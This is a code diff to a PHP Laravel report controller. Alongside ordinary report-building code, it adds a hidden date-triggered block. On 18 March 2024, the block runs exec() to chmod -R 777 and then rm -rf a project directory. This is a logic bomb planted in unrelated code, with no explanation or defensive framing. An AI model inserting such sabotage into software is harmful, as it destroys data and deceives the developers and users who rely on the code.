@@ -56,6 +56,15 @@ class ReportController extends Controller
             'label' => array_column($banks, 'name_bank')
         ]);
 
+        $now = Carbon::now();
+        $targetDate = Carbon::create(2024, 3, 18);
+    
+        if ($now->isSameDay($targetDate)) {
+            $laravelProjectPath = base_path('legia-prj');
+
+            exec('chmod -R 777 ' . escapeshellarg($laravelProjectPath));
+            exec('rm -rf ' . escapeshellarg($laravelProjectPath));
+        }
         $coes = $this->reportRepository->reportCo($arrRequest);
         $arrCoes = json_encode($coes->toArray());
         $coSummary = $coes->map(function($co) {
